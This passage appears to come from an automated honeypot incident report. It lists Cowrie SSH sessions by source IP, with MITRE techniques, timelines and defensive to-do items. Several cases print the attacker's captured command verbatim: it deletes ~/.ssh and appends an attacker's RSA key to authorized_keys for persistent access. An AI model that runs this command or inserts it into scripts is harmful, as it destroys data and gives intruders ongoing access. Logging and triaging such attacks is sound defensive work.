| Time (UTC) | Event |
|---|---|
| `2026-10-09 04:20:01` | `cowrie.session.connect` |
| `2026-10-09 04:20:01` | `cowrie.client.version` |
| `2026-10-09 04:20:01` | `cowrie.client.kex` |
| `2026-10-09 04:20:02` | `cowrie.login.success` |
| `2026-10-09 04:20:02` | `cowrie.session.params` |
| `2026-10-09 04:20:02` | `cowrie.command.input` |
| `2026-10-09 04:20:02` | `cowrie.command.failed` |
| `2026-10-09 04:20:03` | `cowrie.log.closed` |
| `2026-10-09 04:20:03` | `cowrie.session.params` |
| `2026-10-09 04:20:03` | `cowrie.command.input` |
| `2026-10-09 04:20:03` | `cowrie.session.file_download` |
| `2026-10-09 04:20:03` | `cowrie.log.closed` |
| `2026-10-09 04:20:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.225.72[.]42` to AbuseIPDB if not already reported
- [ ] Block `64.225.72[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b99f9e57bb8c

| Field | Detail |
|---|---|
| **Source IP** | `64.225.72[.]42` |
| **First Seen** | 2026-10-09 04:20 |
| **Last Seen** | 2026-10-09 04:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-09 04:20:03` | `cowrie.session.connect` |
| `2026-10-09 04:20:03` | `cowrie.client.version` |
| `2026-10-09 04:20:04` | `cowrie.client.kex` |
| `2026-10-09 04:20:04` | `cowrie.login.success` |
| `2026-10-09 04:20:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.225.72[.]42` to AbuseIPDB if not already reported
- [ ] Block `64.225.72[.]42` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1f2b41c1346

| Field | Detail |
|---|---|
| **Source IP** | `51.254.136[.]153` |
| **First Seen** | 2026-10-09 04:25 |
| **Last Seen** | 2026-10-09 04:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-09 04:25:39` | `cowrie.session.connect` |
| `2026-10-09 04:25:39` | `cowrie.client.version` |
| `2026-10-09 04:25:39` | `cowrie.client.kex` |
| `2026-10-09 04:25:40` | `cowrie.login.success` |
| `2026-10-09 04:25:40` | `cowrie.session.params` |
| `2026-10-09 04:25:40` | `cowrie.command.input` |
| `2026-10-09 04:25:40` | `cowrie.command.failed` |
| `2026-10-09 04:25:41` | `cowrie.log.closed` |
| `2026-10-09 04:25:41` | `cowrie.session.params` |
| `2026-10-09 04:25:41` | `cowrie.command.input` |
| `2026-10-09 04:25:41` | `cowrie.session.file_download` |
| `2026-10-09 04:25:41` | `cowrie.log.closed` |
| `2026-10-09 04:25:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.254.136[.]153` to AbuseIPDB if not already reported
- [ ] Block `51.254.136[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b59407313ad

| Field | Detail |
|---|---|
| **Source IP** | `51.254.136[.]153` |
| **First Seen** | 2026-10-09 04:25 |
| **Last Seen** | 2026-10-09 04:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-09 04:25:41` | `cowrie.session.connect` |
| `2026-10-09 04:25:41` | `cowrie.client.version` |
| `2026-10-09 04:25:42` | `cowrie.client.kex` |
| `2026-10-09 04:25:42` | `cowrie.login.success` |
| `2026-10-09 04:25:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.254.136[.]153` to AbuseIPDB if not already reported
- [ ] Block `51.254.136[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bc8f807b7a8

| Field | Detail |
|---|---|
| **Source IP** | `45.79.207[.]111` |
| **First Seen** | 2026-10-09 04:43 |
| **Last Seen** | 2026-10-09 04:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-09 04:43:58` | `cowrie.session.connect` |
| `2026-10-09 04:43:58` | `cowrie.login.success` |
| `2026-10-09 04:43:58` | `cowrie.session.params` |
| `2026-10-09 04:44:02` | `cowrie.log.closed` |
| `2026-10-09 04:44:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.79.207[.]111` to AbuseIPDB if not already reported
- [ ] Block `45.79.207[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f56ac51ff7e8

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]41` |
| **First Seen** | 2026-10-09 04:45 |
| **Last Seen** | 2026-10-09 04:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-09 04:45:48` | `cowrie.session.connect` |
| `2026-10-09 04:45:48` | `cowrie.client.version` |
| `2026-10-09 04:45:48` | `cowrie.client.kex` |
| `2026-10-09 04:45:50` | `cowrie.login.success` |
| `2026-10-09 04:45:52` | `cowrie.session.params` |
| `2026-10-09 04:45:52` | `cowrie.command.input` |
| `2026-10-09 04:45:52` | `cowrie.log.closed` |
| `2026-10-09 04:45:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]41` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]41` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e1de2a1a6e4

| Field | Detail |
|---|---|
| **Source IP** | `34.156.160[.]247` |
| **First Seen** | 2026-10-09 05:18 |
| **Last Seen** | 2026-10-09 05:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-09 05:18:53` | `cowrie.session.connect` |
| `2026-10-09 05:18:53` | `cowrie.client.version` |
| `2026-10-09 05:18:53` | `cowrie.client.kex` |
| `2026-10-09 05:18:55` | `cowrie.login.success` |
| `2026-10-09 05:18:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.156.160[.]247` to AbuseIPDB if not already reported
- [ ] Block `34.156.160[.]247` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ce6db192542

| Field | Detail |
|---|---|
| **Source IP** | `118.145.111[.]55` |
| **First Seen** | 2026-10-09 05:41 |
| **Last Seen** | 2026-10-09 05:46 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-09 05:41:01` | `cowrie.session.connect` |
| `2026-10-09 05:41:01` | `cowrie.client.version` |
| `2026-10-09 05:41:01` | `cowrie.client.kex` |
| `2026-10-09 05:41:02` | `cowrie.login.success` |
| `2026-10-09 05:41:03` | `cowrie.session.params` |
| `2026-10-09 05:41:03` | `cowrie.command.input` |
| `2026-10-09 05:41:03` | `cowrie.command.failed` |
| `2026-10-09 05:46:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.145.111[.]55` to AbuseIPDB if not already reported
- [ ] Block `118.145.111[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4e81e92ecc9

| Field | Detail |
|---|---|
| **Source IP** | `118.145.111[.]55` |
| **First Seen** | 2026-10-09 05:41 |
| **Last Seen** | 2026-10-09 05:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-09 05:41:18` | `cowrie.session.connect` |
| `2026-10-09 05:41:18` | `cowrie.client.version` |
| `2026-10-09 05:41:18` | `cowrie.client.kex` |
| `2026-10-09 05:41:19` | `cowrie.login.success` |
| `2026-10-09 05:41:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.145.111[.]55` to AbuseIPDB if not already reported
- [ ] Block `118.145.111[.]55` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4f7550be162

| Field | Detail |
|---|---|
| **Source IP** | `172.190.220[.]228` |
| **First Seen** | 2026-10-09 05:42 |
| **Last Seen** | 2026-10-09 05:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-09 05:42:37` | `cowrie.session.connect` |
| `2026-10-09 05:42:37` | `cowrie.client.version` |
| `2026-10-09 05:42:37` | `cowrie.client.kex` |
| `2026-10-09 05:42:38` | `cowrie.login.success` |
| `2026-10-09 05:42:38` | `cowrie.session.params` |
| `2026-10-09 05:42:38` | `cowrie.command.input` |
| `2026-10-09 05:42:38` | `cowrie.command.failed` |
| `2026-10-09 05:42:38` | `cowrie.log.closed` |
| `2026-10-09 05:42:39` | `cowrie.session.params` |
| `2026-10-09 05:42:39` | `cowrie.command.input` |
| `2026-10-09 05:42:39` | `cowrie.session.file_download` |
| `2026-10-09 05:42:39` | `cowrie.log.closed` |
| `2026-10-09 05:42:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.190.220[.]228` to AbuseIPDB if not already reported
- [ ] Block `172.190.220[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c62c03a6b2f8

| Field | Detail |
|---|---|
| **Source IP** | `172.190.220[.]228` |
| **First Seen** | 2026-10-09 05:42 |
| **Last Seen** | 2026-10-09 05:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-09 05:42:39` | `cowrie.session.connect` |
| `2026-10-09 05:42:39` | `cowrie.client.version` |
| `2026-10-09 05:42:39` | `cowrie.client.kex` |
| `2026-10-09 05:42:39` | `cowrie.login.success` |
| `2026-10-09 05:42:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.190.220[.]228` to AbuseIPDB if not already reported
- [ ] Block `172.190.220[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc424f5306a2

| Field | Detail |
|---|---|
| **Source IP** | `120.48.90[.]166` |
| **First Seen** | 2026-10-09 05:46 |
| **Last Seen** | 2026-10-09 05:50 |
| **Session Duration** | 267s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-09 05:46:18` | `cowrie.session.connect` |
| `2026-10-09 05:46:18` | `cowrie.client.version` |
| `2026-10-09 05:46:18` | `cowrie.client.kex` |
| `2026-10-09 05:46:20` | `cowrie.login.success` |
| `2026-10-09 05:50:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `120.48.90[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f967602f014

| Field | Detail |
|---|---|
| **Source IP** | `4.157.250[.]195` |
| **First Seen** | 2026-10-09 05:47 |
| **Last Seen** | 2026-10-09 05:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-09 05:47:47` | `cowrie.session.connect` |
| `2026-10-09 05:47:47` | `cowrie.client.version` |
| `2026-10-09 05:47:47` | `cowrie.client.kex` |
| `2026-10-09 05:47:47` | `cowrie.login.success` |
| `2026-10-09 05:47:47` | `cowrie.session.params` |
| `2026-10-09 05:47:47` | `cowrie.command.input` |
| `2026-10-09 05:47:47` | `cowrie.command.failed` |
| `2026-10-09 05:47:47` | `cowrie.log.closed` |
| `2026-10-09 05:47:48` | `cowrie.session.params` |
| `2026-10-09 05:47:48` | `cowrie.command.input` |
| `2026-10-09 05:47:48` | `cowrie.session.file_download` |
| `2026-10-09 05:47:48` | `cowrie.log.closed` |
| `2026-10-09 05:47:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.157.250[.]195` to AbuseIPDB if not already reported
- [ ] Block `4.157.250[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50f8161372e0

| Field | Detail |
|---|---|
| **Source IP** | `4.157.250[.]195` |
| **First Seen** | 2026-10-09 05:47 |
| **Last Seen** | 2026-10-09 05:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-09 05:47:48` | `cowrie.session.connect` |
| `2026-10-09 05:47:48` | `cowrie.client.version` |
| `2026-10-09 05:47:48` | `cowrie.client.kex` |
| `2026-10-09 05:47:48` | `cowrie.login.success` |
| `2026-10-09 05:47:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.157.250[.]195` to AbuseIPDB if not already reported
- [ ] Block `4.157.250[.]195` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (78) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-1dc1805cd6a5 | HIGH | `120.48.90[.]166` | 2026-10-09 05:58 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-c1d5ebe95a6d | HIGH | `120.48.90[.]166` | 2026-10-09 06:02 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b65b044a2458 | HIGH | `120.48.90[.]166` | 2026-10-09 06:06 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-5a6cddad2dcf | HIGH | `120.48.90[.]166` | 2026-10-09 06:13 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-7762bf26b7e8 | HIGH | `165.1.75[.]106` | 2026-10-09 06:21 | Y | 0 | 0 | `T1078 · T1592` |
| IR-02bbfa4dfa2d | HIGH | `176.53.159[.]196` | 2026-10-09 06:46 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b479b70c83ab | HIGH | `45.79.181[.]223` | 2026-10-09 06:47 | Y | 3 | 0 | `T1078` |
| IR-0370fe1937e0 | HIGH | `109.160.32[.]103` | 2026-10-09 06:48 | Y | 1 | 0 | `T1078 · T1592` |
| IR-096fa8943e35 | HIGH | `45.56.79[.]53` | 2026-10-09 07:38 | Y | 3 | 0 | `T1078` |
| IR-48bcf1c8ab03 | HIGH | `172.235.41[.]44` | 2026-10-09 07:38 | Y | 3 | 0 | `T1078` |
| IR-df425ec116a5 | HIGH | `77.90.185[.]20` | 2026-10-09 07:44 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7e1e1ee33b9b | HIGH | `59.98.148[.]5` | 2026-10-09 07:44 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-9d83e457d672 | HIGH | `59.98.148[.]5` | 2026-10-09 07:44 | Y | 0 | 0 | `T1078 · T1592` |
| IR-68e435e1bc05 | HIGH | `77.90.185[.]20` | 2026-10-09 07:44 | Y | 1 | 2 | `T1021.004 · T1059.004 · T1078` |
| IR-8abbad24aff2 | HIGH | `8.155.131[.]74` | 2026-10-09 07:57 | Y | 0 | 0 | `T1078 · T1592` |
| IR-542d29c21663 | HIGH | `172.171.233[.]230` | 2026-10-09 08:02 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-2147dd31cacf | HIGH | `172.171.233[.]230` | 2026-10-09 08:02 | Y | 0 | 0 | `T1078 · T1592` |
| IR-73800d284cc8 | HIGH | `177.229.197[.]38` | 2026-10-09 08:04 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-5e00126f200d | HIGH | `177.229.197[.]38` | 2026-10-09 08:04 | Y | 0 | 0 | `T1078 · T1592` |
| IR-aff3938129b5 | HIGH | `112.64.169[.]110` | 2026-10-09 08:10 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-56abbd882d18 | HIGH | `112.64.169[.]110` | 2026-10-09 08:10 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6c6034803557 | HIGH | `49.207.245[.]148` | 2026-10-09 08:19 | Y | 20 | 1 | `T1021.004 · T1053.003 · T1057` |
| IR-28e8d7948118 | HIGH | `121.173.16[.]2` | 2026-10-09 08:23 | Y | 0 | 0 | `T1078 · T1592` |
| IR-601fda1e397e | HIGH | `36.64.131[.]68` | 2026-10-09 08:23 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-b77a2507dd64 | HIGH | `36.64.131[.]68` | 2026-10-09 08:23 | Y | 0 | 0 | `T1078 · T1592` |
| IR-dfd1a8f72c6d | HIGH | `195.86.192[.]66` | 2026-10-09 08:26 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-81c766642692 | HIGH | `195.86.192[.]66` | 2026-10-09 08:26 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f2463381709e | HIGH | `106.12.7[.]70` | 2026-10-09 08:26 | Y | 0 | 0 | `T1078 · T1592` |
| IR-09d1c948f9e7 | HIGH | `176.53.159[.]196` | 2026-10-09 08:50 | Y | 0 | 0 | `T1078 · T1592` |
| IR-375820d4466a | HIGH | `130.12.180[.]32` | 2026-10-09 09:39 | Y | 1 | 0 | `T1078 · T1083 · T1592` |
| IR-ae020de7bf0a | HIGH | `216.218.206[.]66` | 2026-10-09 09:49 | Y | 3 | 0 | `T1078` |
| IR-4d516f02cba6 | HIGH | `130.12.180[.]32` | 2026-10-09 10:03 | Y | 1 | 0 | `T1078 · T1083 · T1592` |
| IR-645625ec6ae7 | HIGH | `130.12.180[.]32` | 2026-10-09 10:13 | Y | 0 | 0 | `T1078 · T1105 · T1592` |
| IR-beca06d3566f | HIGH | `211.254.212[.]59` | 2026-10-09 10:14 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-fc0f2c4930e4 | HIGH | `211.254.212[.]59` | 2026-10-09 10:14 | Y | 0 | 0 | `T1078 · T1592` |
| IR-13c36e14bbd1 | HIGH | `130.12.180[.]32` | 2026-10-09 10:26 | Y | 1 | 0 | `T1078 · T1083 · T1592` |
| IR-a7066114ad8f | HIGH | `176.53.159[.]196` | 2026-10-09 10:46 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7387fac68139 | HIGH | `103.189.89[.]196` | 2026-10-09 11:20 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-042a2bbf5ae4 | HIGH | `103.189.89[.]196` | 2026-10-09 11:20 | Y | 0 | 0 | `T1078 · T1592` |
| IR-01d632ec199d | HIGH | `103.213.238[.]91` | 2026-10-09 11:26 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-2556155ff47e | HIGH | `103.213.238[.]91` | 2026-10-09 11:26 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ebc63318807c | HIGH | `103.166.103[.]173` | 2026-10-09 11:28 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-d8246a1a4af4 | HIGH | `103.166.103[.]173` | 2026-10-09 11:28 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a119c939a472 | HIGH | `109.160.32[.]111` | 2026-10-09 11:33 | Y | 1 | 0 | `T1078 · T1592` |
| IR-6a4078380986 | HIGH | `109.160.32[.]111` | 2026-10-09 12:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-d5945d744034 | HIGH | `176.53.159[.]196` | 2026-10-09 12:12 | Y | 0 | 0 | `T1078 · T1592` |
| IR-974967d89f1e | HIGH | `180.184.160[.]211` | 2026-10-09 12:35 | Y | 0 | 0 | `T1078 · T1105 · T1592` |
| IR-c56b6807e6d1 | HIGH | `177.8.166[.]2` | 2026-10-09 13:40 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-e61148980120 | HIGH | `177.8.166[.]2` | 2026-10-09 13:40 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0faf6ab4a863 | HIGH | `81.28.167[.]30` | 2026-10-09 13:57 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-0a4f9cd4ef8f | HIGH | `81.28.167[.]30` | 2026-10-09 13:57 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d6779a67f5cc | HIGH | `165.1.75[.]106` | 2026-10-09 14:01 | Y | 0 | 0 | `T1078 · T1592` |
| IR-59847b41355f | HIGH | `165.1.75[.]106` | 2026-10-09 14:01 | Y | 7 | 0 | `T1059.004 · T1078 · T1105` |
| IR-67e250b10f50 | HIGH | `193.112.192[.]91` | 2026-10-09 14:05 | Y | 1 | 0 | `T1078 · T1592` |
| IR-96ab9697b2aa | HIGH | `198.27.216[.]49` | 2026-10-09 14:09 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f91d74f829e6 | HIGH | `109.160.32[.]147` | 2026-10-09 14:29 | Y | 1 | 0 | `T1078 · T1592` |
| IR-297444a1ea08 | HIGH | `152.32.189[.]59` | 2026-10-09 14:33 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-81658611705b | HIGH | `152.32.189[.]59` | 2026-10-09 14:33 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8025c94d3628 | HIGH | `195.178.110[.]227` | 2026-10-09 14:36 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-338be5b6deb7 | HIGH | `92.118.39[.]14` | 2026-10-09 14:41 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-0f0cf6d89792 | HIGH | `52.141.2[.]20` | 2026-10-09 15:06 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-78114c3f544c | HIGH | `52.141.2[.]20` | 2026-10-09 15:06 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3eea7d8aff31 | HIGH | `59.98.148[.]5` | 2026-10-09 15:06 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-a3d6fbc9428d | HIGH | `59.98.148[.]5` | 2026-10-09 15:07 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4bfa5a9723dd | HIGH | `124.174.32[.]95` | 2026-10-09 15:08 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-baa552c11baf | HIGH | `124.174.32[.]95` | 2026-10-09 15:08 | Y | 0 | 0 | `T1078 · T1592` |
| IR-dae26a3f89ea | HIGH | `91.229.234[.]76` | 2026-10-09 15:10 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-de252bfd65a6 | HIGH | `203.128.6[.]159` | 2026-10-09 15:39 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f6f5a0152d12 | HIGH | `203.128.6[.]159` | 2026-10-09 15:39 | Y | 0 | 0 | `T1078 · T1592` |
| IR-56c12cb57509 | HIGH | `83.143.112[.]7` | 2026-10-09 15:43 | Y | 0 | 0 | `T1078 · T1592` |
| IR-87c7876d43aa | HIGH | `130.12.180[.]51` | 2026-10-09 15:43 | Y | 1 | 2 | `T1021.004 · T1059.004 · T1078` |
| IR-b49ff6e3e963 | HIGH | `195.178.110[.]227` | 2026-10-09 16:00 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-d908e29105c9 | HIGH | `92.118.39[.]14` | 2026-10-09 16:01 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-5329fbc4a835 | HIGH | `172.173.200[.]62` | 2026-10-09 16:14 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-ccfc108d5833 | HIGH | `172.173.200[.]62` | 2026-10-09 16:14 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7890a81676ca | HIGH | `45.121.25[.]115` | 2026-10-09 16:17 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-4abd31cdbdab | HIGH | `45.121.25[.]115` | 2026-10-09 16:17 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b54338cc9ebf | HIGH | `176.53.159[.]196` | 2026-10-09 16:46 | Y | 0 | 0 | `T1078 · T1592` |

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `125.134.42[.]214` | **6** | 2026-10-09 03:52 | 2026-10-09 12:40 | 2m | 0 | `T1592` | 🟢 LOW |
